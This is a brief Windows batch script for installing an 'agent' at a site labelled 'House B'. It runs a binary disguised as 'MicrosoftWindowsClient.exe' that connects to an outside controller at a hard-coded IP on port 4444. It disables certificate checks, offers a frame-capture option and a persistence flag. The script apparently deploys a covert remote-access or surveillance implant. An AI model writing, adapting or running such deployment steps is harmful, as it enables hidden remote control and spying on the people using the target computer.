@echo off
echo Agent install - House B
echo Controller 176.229.98.54:4444 TLS
MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca server.crt -insecure
echo ---
echo For production:
echo   MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca server.crt
echo   MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca server.crt -fps 1
echo Persistence:
echo   MicrosoftWindowsClient.exe -persist
pause
